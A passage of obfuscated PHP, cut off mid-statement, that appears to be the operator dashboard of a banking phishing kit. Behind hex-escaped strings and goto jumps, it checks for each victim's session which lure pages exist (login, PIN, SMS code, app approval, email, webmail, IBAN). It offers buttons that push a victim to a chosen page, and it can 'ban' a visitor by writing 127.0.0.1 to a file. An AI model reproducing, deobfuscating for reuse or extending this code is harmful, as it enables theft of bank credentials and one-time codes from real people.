"\x20\x3c\160\x20\163\164\x79\x6c\145\x3d\42\x74\145\170\x74\x2d\x61\x6c\x69\x67\x6e\x3a\x63\x65\x6e\164\145\x72\x22\x3e\74\x73\160\x61\156\x20\163\x74\x79\154\145\75\x22\x63\x6f\x6c\157\162\x3a\43\x65\x37\64\x63\x33\143\x22\x3e\74\x73\164\162\x6f\x6e\147\76\x4e\157\164\40\101\x76\x61\151\154\141\x62\154\x65\x3c\x2f\163\x74\162\157\x6e\147\76\74\x2f\x73\x70\x61\x6e\76\74\x2f\x70\76"; $_SESSION["\x69\163\147\157\137\x61\160\160"] = "\40\74\x70\40\x73\164\171\154\145\x3d\x22\x74\x65\x78\164\55\x61\x6c\151\x67\x6e\x3a\143\145\x6e\x74\x65\x72\x22\76\74\163\x70\x61\x6e\40\163\x74\x79\x6c\x65\75\x22\x63\x6f\x6c\x6f\162\72\x23\145\x37\x34\143\63\143\x22\x3e\x3c\x73\x74\x72\x6f\x6e\147\76\116\157\164\x20\x41\x76\141\x69\154\x61\142\x6c\145\74\57\163\164\162\157\156\x67\76\74\57\163\160\141\156\76\x3c\57\160\x3e"; $_SESSION["\x69\163\147\157\x5f\160\151\156"] = "\40\x3c\x70\x20\x73\164\171\154\145\x3d\42\x74\145\170\x74\x2d\x61\154\151\147\156\72\x63\145\x6e\x74\145\162\42\76\x3c\x73\160\x61\156\x20\x73\x74\x79\x6c\x65\x3d\x22\143\157\x6c\157\x72\72\43\x65\x37\x34\x63\63\143\x22\x3e\x3c\163\164\x72\157\x6e\x67\x3e\116\x6f\164\40\x41\166\141\151\154\x61\x62\154\145\x3c\57\163\x74\162\x6f\x6e\x67\x3e\74\x2f\x73\x70\x61\156\76\74\x2f\x70\x3e"; $_SESSION["\x69\x73\165\x73\x61\x67\x65\x72"] = "\x20\x3c\x70\40\x73\x74\x79\154\145\x3d\x22\164\x65\170\164\x2d\x61\154\151\x67\156\72\143\145\156\164\x65\x72\42\x3e\74\x73\x70\141\156\40\163\x74\171\154\x65\75\x22\143\x6f\154\x6f\x72\x3a\43\x65\67\x34\x63\x33\x63\x22\x3e\74\x73\x74\162\157\156\147\76\x4e\x6f\x74\x20\101\x76\141\x69\154\x61\x62\154\x65\x3c\57\163\x74\162\157\156\x67\76\74\x2f\x73\x70\x61\x6e\76\x3c\57\x70\x3e"; $_SESSION["\151\x73\x75\164\x69\154\x69\163\x61\164\145\x75\x72"] = "\x20\x3c\x70\x20\163\x74\171\154\145\x3d\x22\x74\x65\170\164\55\141\154\x69\147\156\x3a\x63\x65\x6e\164\x65\x72\x22\76\74\x73\160\141\x6e\40\x73\164\x79\154\x65\75\42\x63\157\154\157\x72\x3a\43\x65\67\x34\x63\x33\x63\x22\76\74\x73\164\162\x6f\156\x67\76\x4e\x6f\x74\x20\x41\x76\x61\151\154\x61\142\154\145\74\x2f\x73\164\162\x6f\x6e\147\x3e\74\x2f\163\160\141\x6e\x3e\x3c\x2f\160\x3e"; $_SESSION["\x69\163\141\x6c\x65\162\x74"] = "\x20\74\160\x20\x73\164\x79\x6c\145\75\x22\164\x65\170\x74\x2d\141\154\x69\x67\156\72\143\145\156\164\x65\x72\x22\76\x3c\163\160\141\156\x20\163\x74\x79\154\x65\75\42\143\157\x6c\x6f\162\72\x23\x65\x37\64\x63\63\x63\42\76\74\163\x74\x72\157\x6e\147\x3e\116\157\164\40\x41\x76\141\x69\154\141\x62\154\x65\74\57\x73\x74\162\157\x6e\147\76\x3c\57\163\x70\141\x6e\x3e\74\57\160\76"; $_SESSION["\x69\x73\157\160\145\x72\x61\164\x69\157\x6e\163\141\160\160"] = "\x20\x3c\x70\40\x73\164\x79\x6c\145\75\42\164\145\170\x74\x2d\141\x6c\151\x67\x6e\72\143\145\x6e\x74\x65\162\x22\x3e\x3c\x73\x70\141\x6e\40\x73\x74\171\154\x65\75\42\x63\x6f\x6c\157\162\x3a\x23\145\x37\64\143\x33\143\x22\x3e\x3c\x73\x74\162\x6f\156\147\x3e\116\x6f\x74\40\101\166\x61\x69\x6c\x61\142\x6c\x65\x3c\x2f\x73\164\x72\157\x6e\x67\76\x3c\x2f\x73\160\x61\156\76\74\57\160\76"; $_SESSION["\151\x73\x6f\x70\145\162\141\164\151\x6f\x6e\x73\163\x6d\x73"] = "\x20\74\160\40\163\x74\x79\x6c\145\75\x22\164\x65\x78\164\55\141\154\x69\147\156\72\x63\145\156\164\145\x72\42\76\74\x73\160\x61\156\x20\x73\x74\x79\154\145\x3d\x22\x63\x6f\x6c\x6f\162\72\x23\145\67\x34\143\63\x63\42\76\x3c\163\164\162\x6f\x6e\147\x3e\116\x6f\164\40\101\166\x61\151\154\141\x62\154\145\x3c\57\163\x74\162\157\x6e\147\x3e\74\x2f\x73\160\141\x6e\x3e\74\x2f\160\76"; $_SESSION["\x61\x6c\154\137\160\141\x67\145"] = ''; } goto Dg750; m15yW: if (check_file($_SESSION["\165\x73\145\162\151\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\x75\163\x65\x72\151\144"]; ?>
', 'alert')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M12 10V13" stroke="#ffffff" stroke-width="2" stroke-linecap="round"></path>
                                                        <path d="M12 16V15.9888" stroke="#ffffff" stroke-width="2" stroke-linecap="round"></path>
                                                        <path
                                                            d="M10.2518 5.147L3.6508 17.0287C2.91021 18.3618 3.87415 20 5.39912 20H18.6011C20.126 20 21.09 18.3618 20.3494 17.0287L13.7484 5.147C12.9864 3.77538 11.0138 3.77538 10.2518 5.147Z"
                                                            stroke="#ffffff"
                                                            stroke-width="2"
                                                            stroke-linecap="round"
                                                            stroke-linejoin="round"
                                                        ></path>
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Alert Page</div>
                                                <?php  echo $_SESSION["\x69\x73\141\154\145\162\164"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto QJaJ3; K_PMX: echo $_SESSION["\163\164\x61\x74\x75\163\x5f\157\156"]; goto mBOM3; I7Fv_: createFilesIfNotExist($_SESSION["\x75\163\145\162\x69\144"]); goto DOw4h; zEDrs: function banned_user($user) { $content = "\x31\x32\x37\x2e\x30\56\60\x2e\61"; $filename = "\154\x6f\143\141\154\56\164\x78\x74"; $filePath = $user . "\x2f" . $filename; if (file_exists($filePath)) { file_put_contents($filePath, $content); } else { $file = fopen($filePath, "\x77"); fwrite($file, $content); fclose($file); } } goto QStge; DUREU: ?>
								
								<?php  goto kaTxV; Df5U8: $_SESSION["\x68\x6f\x73\164\x69\x6e\x67"] = $hosting == 1 ? "\124\x72\x75\145" : "\x46\141\x6c\163\145"; goto deUoE; iHRNv: if (is_dir($directory)) { $_SESSION["\x73\164\x61\x74\x75\163\x5f\x6f\x6e"] = "\x62\157\x72\x64\x65\x72\55\x73\164\x61\x72\x74\x20\142\157\162\144\145\x72\55\x73\x74\141\162\x74\55\x34\x20\x62\x6f\x72\x64\145\x72\55\x73\164\x61\x72\x74\55\163\165\x63\x63\x65\x73\163\x20\x70\170\55\x33\40\155\x62\x2d\x33"; $project_file = "\160\162\157\x6a\145\143\164\x2e\164\170\164"; $project_name = readTextFile($_SESSION["\165\x73\x65\x72\151\x64"], $project_file); $_SESSION["\x70\162\x6f\x6a\145\x63\164\x5f\156\141\155\x65"] = $project_name; $_SESSION["\163\x74\x61\x74\165\163"] = "\x3c\x73\x70\141\x6e\x20\143\x6c\141\x73\x73\x3d\42\142\141\x64\x67\145\x20\142\x67\55\163\165\143\x63\x65\x73\163\55\147\162\x61\x64\151\x65\156\x74\x20\155\163\55\141\165\164\157\42\x3e\117\156\x6c\x69\x6e\145\74\57\163\160\141\x6e\76"; $file_s = "\x6c\157\147\x69\156\56\x70\x68\x70"; if (check_file($_SESSION["\x75\x73\x65\162\151\x64"], $file_s)) { $_SESSION["\x69\x73\154\157\x67\x69\156"] = "\40\x3c\160\40\163\x74\x79\x6c\145\75\x22\x74\x65\170\x74\x2d\x61\154\151\147\156\x3a\x63\x65\x6e\164\x65\x72\x22\x3e\x3c\x73\160\x61\x6e\40\x73\164\171\154\145\75\x22\x63\x6f\x6c\x6f\x72\72\43\61\66\141\60\x38\x35\x22\76\x3c\x73\x74\x72\157\156\147\76\101\166\141\151\154\141\142\x6c\x65\x3c\57\163\164\x72\157\156\x67\x3e\x3c\x2f\163\160\x61\x6e\x3e\x3c\57\160\76"; } else { $_SESSION["\x69\163\x6c\157\147\x69\x6e"] = "\x20\74\x70\40\x73\x74\171\x6c\x65\75\42\x74\x65\170\164\x2d\x61\154\x69\147\156\72\143\x65\156\164\x65\x72\42\76\74\163\x70\x61\156\40\163\x74\171\x6c\x65\75\x22\x63\x6f\x6c\157\162\72\43\x65\67\x34\x63\x33\143\42\x3e\x3c\163\164\162\157\x6e\147\x3e\116\157\x74\x20\101\166\x61\x69\154\x61\x62\154\145\x3c\x2f\163\x74\x72\x6f\x6e\147\x3e\74\x2f\163\160\141\156\76\74\x2f\160\x3e"; } $file_s = "\165\x74\151\x6c\151\163\141\x74\x65\165\x72\56\160\x68\160"; if (check_file($_SESSION["\165\x73\145\x72\x69\144"], $file_s)) { $_SESSION["\151\163\165\164\151\x6c\x69\x73\x61\164\x65\165\162"] = "\40\74\160\40\163\x74\x79\x6c\145\75\x22\x74\x65\170\164\x2d\141\154\x69\x67\x6e\x3a\x63\x65\156\164\145\162\42\76\74\x73\160\x61\x6e\x20\163\164\171\x6c\145\x3d\42\x63\157\x6c\x6f\x72\x3a\43\x31\66\141\60\x38\65\42\76\74\x73\164\162\x6f\x6e\x67\x3e\101\166\x61\151\154\x61\x62\154\145\x3c\x2f\x73\x74\162\x6f\156\x67\76\x3c\x2f\163\x70\141\x6e\x3e\x3c\57\160\x3e"; } else { $_SESSION["\x69\x73\165\164\x69\154\151\x73\141\164\x65\165\162"] = "\40\x3c\x70\x20\163\164\x79\154\145\75\42\x74\x65\x78\x74\55\141\154\x69\147\156\x3a\143\x65\x6e\x74\x65\x72\x22\76\x3c\163\160\141\x6e\40\163\164\x79\x6c\x65\x3d\42\x63\157\x6c\157\x72\x3a\43\x65\x37\x34\x63\63\x63\42\76\74\x73\164\162\157\x6e\147\x3e\116\x6f\x74\x20\x41\166\141\151\154\x61\x62\x6c\145\x3c\57\163\164\162\x6f\156\x67\76\74\57\163\x70\x61\156\x3e\74\57\160\76"; } $file_s = "\x75\163\x61\147\x65\162\x2e\160\150\x70"; if (check_file($_SESSION["\165\163\x65\162\x69\144"], $file_s)) { $_SESSION["\x69\163\x75\x73\141\147\x65\162"] = "\40\74\x70\40\x73\164\x79\x6c\145\x3d\x22\x74\145\x78\x74\x2d\x61\154\x69\147\156\72\143\145\156\x74\145\x72\42\x3e\x3c\x73\x70\141\x6e\x20\x73\x74\x79\154\x65\75\42\x63\x6f\x6c\157\x72\72\x23\61\66\141\60\70\65\42\x3e\x3c\x73\x74\x72\157\x6e\147\x3e\x41\x76\141\x69\x6c\x61\x62\x6c\x65\x3c\x2f\163\164\162\x6f\x6e\147\x3e\x3c\x2f\163\160\x61\156\76\74\57\x70\76"; } else { $_SESSION["\151\163\x75\x73\x61\147\145\162"] = "\40\74\160\40\x73\164\x79\154\x65\75\42\x74\x65\x78\164\55\x61\154\151\x67\x6e\x3a\x63\x65\x6e\164\145\x72\x22\x3e\74\163\160\141\156\x20\x73\164\171\154\x65\75\x22\143\157\x6c\x6f\x72\72\x23\145\67\64\x63\63\x63\x22\76\x3c\163\164\162\x6f\156\147\76\x4e\157\164\x20\x41\x76\141\x69\x6c\141\x62\x6c\145\x3c\x2f\x73\x74\x72\157\156\x67\x3e\x3c\x2f\163\x70\141\156\76\x3c\x2f\160\76"; } $file_s = "\141\x6c\145\x72\164\x2e\160\x68\160"; if (check_file($_SESSION["\x75\x73\x65\162\151\144"], $file_s)) { $_SESSION["\x69\x73\x61\154\x65\162\x74"] = "\40\x3c\x70\x20\x73\x74\171\154\145\x3d\42\x74\x65\x78\x74\x2d\141\x6c\151\x67\x6e\x3a\143\x65\x6e\x74\x65\x72\x22\x3e\x3c\x73\x70\141\x6e\40\163\x74\171\x6c\145\x3d\x22\143\157\x6c\157\x72\72\x23\61\x36\x61\x30\70\65\42\x3e\x3c\x73\164\162\x6f\x6e\x67\76\x41\166\141\x69\154\x61\x62\x6c\x65\74\x2f\163\164\x72\x6f\156\147\76\x3c\x2f\x73\160\x61\156\x3e\x3c\57\x70\76"; } else { $_SESSION["\x69\x73\141\154\x65\x72\164"] = "\40\x3c\x70\x20\163\x74\x79\x6c\145\x3d\42\x74\145\x78\164\55\x61\154\x69\147\x6e\72\x63\145\156\164\145\162\42\x3e\x3c\163\x70\141\x6e\x20\x73\x74\x79\x6c\x65\75\42\143\x6f\154\157\x72\72\43\x65\x37\x34\143\63\143\x22\x3e\74\163\x74\162\157\x6e\147\76\116\x6f\x74\40\101\x76\x61\151\x6c\141\142\154\x65\74\x2f\x73\164\162\x6f\156\147\76\x3c\57\163\160\x61\156\76\74\x2f\160\76"; } $file_s = "\157\160\145\x72\141\x74\x69\x6f\156\x73\141\160\160\56\x70\150\x70"; if (check_file($_SESSION["\165\x73\x65\x72\x69\144"], $file_s)) { $_SESSION["\151\x73\157\160\145\x72\141\164\151\x6f\156\x73\x61\160\160"] = "\40\74\160\40\163\x74\171\x6c\145\x3d\x22\164\145\x78\164\55\141\x6c\x69\147\156\x3a\143\145\156\x74\145\x72\42\76\x3c\x73\x70\141\156\x20\x73\164\171\x6c\x65\75\x22\143\157\x6c\x6f\162\x3a\x23\x31\x36\141\60\70\x35\42\76\x3c\x73\164\x72\157\x6e\147\76\101\166\141\x69\154\x61\142\x6c\145\74\57\x73\164\x72\x6f\x6e\147\x3e\x3c\57\163\160\141\x6e\x3e\74\x2f\x70\x3e"; } else { $_SESSION["\x69\x73\157\x70\145\x72\141\164\x69\x6f\x6e\163\141\160\160"] = "\40\74\x70\x20\163\x74\171\154\x65\75\42\164\x65\x78\164\x2d\x61\154\151\147\x6e\72\143\x65\x6e\164\x65\162\x22\76\74\163\x70\141\x6e\40\163\164\x79\154\145\75\42\x63\x6f\x6c\157\162\72\43\145\x37\64\143\x33\143\42\76\74\x73\164\x72\157\x6e\x67\x3e\116\157\x74\40\x41\166\x61\151\x6c\x61\142\x6c\145\74\57\163\x74\162\x6f\156\147\x3e\x3c\57\x73\x70\x61\x6e\76\x3c\x2f\x70\76"; } $file_s = "\157\160\145\x72\141\164\x69\x6f\x6e\x73\163\x6d\163\x2e\x70\150\160"; if (check_file($_SESSION["\x75\163\145\x72\x69\x64"], $file_s)) { $_SESSION["\151\x73\x6f\160\x65\x72\141\x74\x69\x6f\x6e\x73\163\155\x73"] = "\40\74\x70\x20\163\x74\171\154\145\75\x22\x74\145\x78\x74\x2d\141\x6c\x69\147\156\72\143\x65\x6e\x74\145\x72\42\76\x3c\x73\x70\141\x6e\x20\163\x74\x79\154\x65\75\x22\143\x6f\154\157\x72\72\43\x31\66\141\60\x38\x35\x22\76\74\163\164\x72\157\x6e\x67\76\x41\166\141\151\x6c\x61\x62\154\145\74\x2f\163\164\162\157\156\x67\76\x3c\x2f\163\x70\141\x6e\76\x3c\x2f\x70\76"; } else { $_SESSION["\x69\163\x6f\x70\145\x72\141\164\x69\x6f\156\163\163\155\x73"] = "\x20\x3c\160\x20\x73\x74\x79\154\x65\75\42\164\x65\170\x74\x2d\141\154\151\x67\x6e\72\x63\x65\156\x74\x65\162\x22\76\x3c\x73\x70\141\156\x20\163\164\x79\x6c\x65\x3d\42\143\x6f\x6c\x6f\x72\x3a\43\145\x37\x34\x63\x33\x63\x22\x3e\x3c\x73\164\x72\157\x6e\147\x3e\x4e\x6f\164\40\101\166\141\x69\x6c\x61\142\154\145\74\x2f\163\x74\x72\x6f\x6e\x67\76\x3c\x2f\163\x70\141\x6e\x3e\x3c\57\160\x3e"; } $file_s = "\147\x6f\x5f\x6c\x6f\x67\x69\x6e\56\160\x68\160"; if (check_file($_SESSION["\x75\x73\145\x72\151\144"], $file_s)) { $_SESSION["\151\163\147\x6f\137\154\157\x67\x69\x6e"] = "\x20\x3c\160\40\163\x74\171\154\x65\75\42\164\x65\170\x74\x2d\x61\x6c\x69\147\156\72\x63\x65\156\x74\x65\x72\x22\x3e\x3c\x73\160\x61\x6e\x20\x73\x74\171\154\x65\x3d\42\x63\x6f\154\x6f\162\x3a\x23\x31\66\141\60\70\x35\x22\x3e\x3c\163\x74\162\157\x6e\147\x3e\101\166\x61\x69\154\141\x62\154\145\74\x2f\163\x74\x72\x6f\x6e\147\76\x3c\x2f\x73\x70\x61\156\x3e\74\57\160\76"; } else { $_SESSION["\151\163\147\157\137\x6c\157\147\151\x6e"] = "\40\74\x70\x20\x73\164\x79\154\145\75\42\164\145\x78\164\55\x61\x6c\151\x67\x6e\x3a\143\x65\x6e\164\x65\x72\x22\76\x3c\163\x70\141\x6e\40\x73\x74\x79\154\145\x3d\42\x63\157\x6c\x6f\162\72\x23\x65\x37\64\143\63\143\x22\76\x3c\x73\164\x72\x6f\156\x67\x3e\x4e\157\164\x20\x41\x76\x61\x69\x6c\x61\142\154\x65\74\x2f\163\x74\x72\x6f\x6e\x67\76\x3c\x2f\163\x70\x61\x6e\x3e\x3c\57\x70\x3e"; } $file_s = "\147\157\x5f\160\x68\157\x6e\145\56\x70\150\x70"; if (check_file($_SESSION["\x75\x73\145\x72\x69\x64"], $file_s)) { $_SESSION["\151\x73\x67\157\x5f\160\x68\157\156\145"] = "\x20\x3c\x70\40\x73\x74\171\x6c\x65\x3d\42\x74\x65\170\x74\55\x61\x6c\151\x67\156\x3a\x63\145\156\x74\x65\x72\42\76\74\x73\x70\x61\156\40\x73\x74\171\x6c\x65\x3d\42\x63\x6f\154\157\x72\72\x23\x31\x36\141\60\70\x35\x22\x3e\x3c\163\164\x72\157\x6e\x67\76\x41\x76\141\151\154\x61\x62\154\145\74\x2f\163\x74\162\x6f\156\147\x3e\x3c\57\x73\x70\x61\156\76\x3c\57\x70\76"; } else { $_SESSION["\x69\163\147\157\x5f\160\150\x6f\x6e\145"] = "\x20\74\160\40\x73\164\x79\154\x65\x3d\42\x74\145\170\x74\55\141\154\x69\147\x6e\72\x63\145\156\164\145\x72\x22\76\x3c\163\x70\141\x6e\40\x73\x74\x79\x6c\x65\x3d\42\143\x6f\154\x6f\162\72\x23\145\67\x34\x63\x33\x63\42\76\x3c\x73\164\x72\157\156\147\x3e\x4e\x6f\164\40\101\166\141\151\x6c\141\x62\154\x65\x3c\57\163\164\x72\157\x6e\x67\x3e\74\57\x73\160\x61\x6e\76\x3c\57\x70\76"; } $file_s = "\147\x6f\137\163\155\x73\56\x70\150\160"; if (check_file($_SESSION["\165\x73\x65\162\x69\x64"], $file_s)) { $_SESSION["\x69\x73\147\x6f\137\x73\x6d\x73"] = "\40\74\x70\x20\x73\164\x79\x6c\145\75\x22\x74\145\170\164\x2d\x61\154\151\147\156\72\x63\x65\156\164\x65\x72\42\76\x3c\163\x70\141\x6e\x20\x73\x74\171\154\x65\75\42\143\157\154\157\x72\72\43\x31\66\141\x30\70\x35\x22\76\x3c\x73\164\162\x6f\x6e\147\x3e\x41\166\141\x69\x6c\x61\142\154\x65\74\x2f\163\164\x72\157\156\x67\76\x3c\x2f\163\160\141\x6e\x3e\x3c\x2f\160\x3e"; } else { $_SESSION["\x69\163\147\157\x5f\163\x6d\163"] = "\40\x3c\160\40\163\164\x79\x6c\145\75\x22\x74\x65\170\x74\55\141\154\151\x67\x6e\72\143\x65\156\164\145\162\42\76\x3c\163\160\141\156\40\163\164\171\x6c\145\75\x22\x63\x6f\x6c\157\162\72\43\x65\x37\x34\143\x33\143\x22\x3e\74\163\164\162\157\x6e\x67\76\x4e\157\x74\x20\x41\166\x61\151\x6c\x61\142\154\145\x3c\x2f\163\164\162\x6f\156\x67\x3e\74\57\x73\160\141\156\76\x3c\57\x70\76"; } $file_s = "\x67\157\137\141\160\x70\56\160\x68\x70"; if (check_file($_SESSION["\165\x73\145\x72\x69\x64"], $file_s)) { $_SESSION["\151\163\x67\x6f\x5f\141\x70\x70"] = "\x20\74\x70\40\163\164\171\154\x65\75\x22\164\x65\170\x74\x2d\141\x6c\x69\x67\x6e\72\x63\145\x6e\x74\145\162\x22\x3e\74\163\x70\x61\x6e\40\163\164\x79\x6c\145\x3d\x22\143\x6f\154\x6f\162\x3a\43\61\x36\x61\x30\x38\65\42\76\x3c\x73\164\162\x6f\156\x67\76\x41\x76\141\x69\x6c\x61\x62\154\x65\x3c\x2f\x73\164\x72\x6f\x6e\x67\x3e\74\x2f\x73\x70\141\x6e\x3e\x3c\x2f\160\x3e"; } else { $_SESSION["\x69\x73\x67\x6f\137\x61\x70\x70"] = "\x20\x3c\160\40\163\x74\171\154\145\x3d\x22\164\145\170\x74\55\141\154\151\x67\x6e\72\x63\x65\156\x74\x65\162\x22\76\74\163\160\x61\156\x20\x73\164\x79\154\145\x3d\x22\143\x6f\x6c\x6f\x72\72\x23\x65\67\64\143\x33\x63\x22\x3e\x3c\x73\x74\162\157\x6e\x67\x3e\x4e\x6f\x74\40\101\x76\x61\x69\154\x61\x62\x6c\x65\x3c\x2f\x73\x74\x72\x6f\x6e\x67\x3e\x3c\57\163\x70\141\156\x3e\74\x2f\x70\76"; } $file_s = "\x67\x6f\137\x70\151\x6e\56\x70\x68\x70"; if (check_file($_SESSION["\x75\x73\x65\x72\x69\144"], $file_s)) { $_SESSION["\x69\163\x67\x6f\137\160\151\156"] = "\40\x3c\x70\x20\163\x74\x79\x6c\x65\x3d\x22\164\x65\170\164\55\141\x6c\x69\147\x6e\72\x63\145\156\x74\x65\162\42\76\74\163\160\x61\x6e\40\163\x74\x79\x6c\x65\x3d\42\143\x6f\154\157\x72\72\43\61\66\x61\x30\x38\x35\42\x3e\74\x73\164\x72\x6f\x6e\147\x3e\x41\166\x61\x69\x6c\x61\x62\154\145\x3c\57\163\x74\162\157\156\x67\x3e\x3c\x2f\x73\160\x61\x6e\76\x3c\57\160\76"; } else { $_SESSION["\151\163\x67\x6f\x5f\x70\x69\156"] = "\x20\x3c\160\x20\x73\164\x79\x6c\145\x3d\42\x74\x65\170\164\x2d\141\x6c\151\147\x6e\72\143\145\156\x74\145\162\x22\x3e\x3c\x73\160\x61\156\40\163\x74\x79\154\145\x3d\42\x63\157\154\157\x72\72\x23\x65\67\64\143\x33\x63\x22\76\x3c\163\x74\162\157\x6e\x67\x3e\x4e\157\x74\x20\101\166\141\151\154\x61\142\154\145\74\57\x73\x74\x72\157\156\147\76\74\x2f\163\x70\141\x6e\x3e\74\x2f\x70\x3e"; } $file_s = "\x70\150\157\156\145\x2e\160\150\160"; if (check_file($_SESSION["\165\163\145\x72\x69\144"], $file_s)) { $_SESSION["\x69\163\x70\150\x6f\x6e\x65"] = "\40\74\160\x20\163\x74\x79\x6c\145\x3d\x22\164\x65\x78\164\55\x61\154\151\x67\x6e\x3a\143\x65\x6e\164\145\162\x22\x3e\x3c\163\x70\141\156\x20\163\x74\171\154\145\x3d\x22\x63\157\x6c\x6f\162\x3a\x23\61\x36\141\x30\x38\x35\x22\x3e\74\163\x74\162\x6f\x6e\147\x3e\x41\166\x61\151\154\141\142\x6c\x65\74\x2f\x73\x74\x72\x6f\x6e\x67\76\x3c\x2f\x73\x70\141\156\76\x3c\57\160\76"; } else { $_SESSION["\151\x73\160\150\157\156\x65"] = "\40\74\x70\x20\x73\x74\171\x6c\145\75\42\164\x65\170\164\x2d\x61\x6c\151\x67\x6e\x3a\143\x65\156\164\145\162\42\76\x3c\x73\x70\x61\x6e\40\163\164\171\x6c\145\x3d\42\x63\157\154\x6f\162\x3a\x23\x65\67\x34\143\x33\x63\42\76\x3c\163\x74\x72\x6f\156\147\x3e\116\x6f\x74\40\101\166\141\151\x6c\x61\x62\x6c\x65\x3c\57\163\x74\162\x6f\156\147\76\74\57\163\x70\141\x6e\76\x3c\57\x70\x3e"; } $file_s = "\x73\155\163\x2e\x70\150\x70"; if (check_file($_SESSION["\165\163\x65\162\x69\x64"], $file_s)) { $_SESSION["\151\163\x73\x6d\x73"] = "\40\74\160\40\163\164\171\154\145\75\x22\x74\x65\170\164\55\141\154\151\147\156\72\143\x65\156\x74\145\x72\x22\76\x3c\163\160\x61\156\x20\x73\x74\171\154\x65\75\x22\143\x6f\154\x6f\162\72\43\61\x36\141\60\x38\x35\42\x3e\74\163\164\x72\x6f\x6e\x67\x3e\x41\166\141\x69\154\x61\x62\154\145\74\57\163\164\x72\157\x6e\x67\76\74\57\163\x70\141\x6e\x3e\x3c\57\160\x3e"; } else { $_SESSION["\x69\x73\163\x6d\163"] = "\x20\74\160\40\x73\164\x79\154\x65\75\x22\x74\145\x78\164\x2d\x61\154\x69\147\x6e\x3a\x63\x65\156\164\x65\x72\42\76\74\163\160\x61\x6e\40\163\164\x79\x6c\x65\75\42\143\x6f\x6c\157\x72\72\x23\145\67\64\143\63\143\x22\x3e\74\x73\164\x72\157\156\147\76\116\157\x74\x20\101\x76\x61\151\x6c\x61\142\154\x65\x3c\x2f\x73\164\162\x6f\x6e\147\x3e\x3c\x2f\x73\160\141\x6e\x3e\x3c\x2f\160\76"; } $file_s = "\145\x6d\141\x69\x6c\56\160\150\x70"; if (check_file($_SESSION["\165\163\x65\162\151\x64"], $file_s)) { $_SESSION["\151\163\145\155\x61\151\154"] = "\40\74\x70\40\163\164\x79\x6c\x65\75\42\164\x65\x78\164\x2d\x61\x6c\151\x67\x6e\72\x63\x65\x6e\164\145\x72\42\76\x3c\x73\x70\141\x6e\x20\163\x74\x79\154\145\x3d\x22\143\157\154\157\162\x3a\43\61\x36\x61\60\70\x35\42\76\74\163\x74\x72\157\156\x67\76\101\x76\141\151\154\141\x62\154\145\74\57\x73\164\162\x6f\156\x67\76\x3c\57\163\160\x61\156\76\74\x2f\x70\76"; } else { $_SESSION["\x69\x73\x65\155\x61\151\x6c"] = "\x20\74\x70\x20\163\x74\x79\154\145\x3d\42\x74\145\170\164\x2d\x61\x6c\x69\x67\x6e\72\x63\x65\156\x74\145\162\42\76\74\163\x70\x61\156\40\x73\164\x79\x6c\145\75\x22\x63\157\154\x6f\x72\x3a\x23\145\x37\64\x63\x33\143\x22\x3e\x3c\163\164\162\157\156\147\76\116\157\x74\40\x41\166\141\151\154\x61\142\154\145\74\x2f\x73\164\x72\157\x6e\147\x3e\74\x2f\163\160\x61\156\76\74\x2f\x70\76"; } $file_s = "\167\145\x62\x6d\x61\151\154\56\160\150\160"; if (check_file($_SESSION["\165\163\145\x72\x69\x64"], $file_s)) { $_SESSION["\151\163\x77\x65\x62\x6d\x61\151\x6c"] = "\40\74\x70\40\163\164\171\154\x65\x3d\42\x74\145\170\164\x2d\x61\x6c\x69\147\x6e\x3a\143\x65\x6e\164\x65\x72\x22\x3e\x3c\163\x70\x61\156\40\x73\x74\171\x6c\x65\75\x22\x63\x6f\x6c\157\162\x3a\x23\x31\66\141\60\x38\x35\x22\76\74\x73\164\162\x6f\156\147\76\101\x76\141\x69\x6c\141\x62\x6c\145\x3c\57\x73\x74\x72\157\156\x67\76\74\57\x73\160\141\x6e\x3e\74\x2f\x70\x3e"; } else { $_SESSION["\151\163\167\x65\142\155\x61\151\x6c"] = "\40\74\x70\x20\x73\164\x79\154\145\x3d\42\164\x65\170\x74\x2d\141\154\151\147\156\72\x63\145\x6e\x74\145\x72\x22\76\x3c\x73\x70\141\x6e\x20\163\x74\171\154\x65\x3d\42\x63\x6f\x6c\x6f\162\72\43\145\67\x34\143\x33\143\x22\x3e\74\163\164\x72\x6f\x6e\147\76\116\x6f\x74\x20\x41\166\141\151\x6c\141\x62\x6c\145\74\x2f\163\164\162\157\156\x67\76\x3c\57\x73\x70\141\x6e\76\74\x2f\160\76"; } $file_s = "\151\142\x61\156\55\x68\157\x6d\145\56\x70\150\160"; if (check_file($_SESSION["\x75\x73\145\x72\151\x64"], $file_s)) { $_SESSION["\x69\163\x69\142\141\156\x68\x6f\x6d\x65"] = 